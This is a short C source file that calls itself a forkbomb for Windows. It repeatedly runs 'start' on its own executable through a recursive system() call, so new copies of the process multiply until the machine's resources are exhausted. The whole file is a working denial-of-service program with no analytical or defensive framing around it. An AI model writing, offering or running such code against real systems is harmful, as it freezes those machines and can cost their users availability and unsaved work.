#include <stdio.h>
#include <stdlib.h>
#include <stdnoreturn.h>
#include <string.h>

char * cmd;
noreturn inline static void forkbomb(void);

int main (int argc,char * argv[]) {
  if (argc != 1) {
    if (strcmp(argv[1],"-h") == 0 || strcmp(argv[1],"--help") == 0) {
      printf("This is a forkbomb for windows,\n"
             "\t-h,--help: show this help;\n"
             "\tdefault: run forkbomb.\n");
      return 4;
    }
  }
  if ((cmd = malloc(sizeof(char) * (strlen(argv[0])+7))) != 0) {
    cmd[0] = 's';
    cmd[1] = 't';
    cmd[2] = 'a';
    cmd[3] = 'r';
    cmd[4] = 't';
    cmd[5] = ' ';
    memcpy(cmd+6,*argv,strlen(argv[0])+1);
    forkbomb();
  } else
    printf("Memory alloc failed.\n");
  return 1;
}

noreturn inline static void forkbomb(void) {
  system(cmd);
  forkbomb();
}
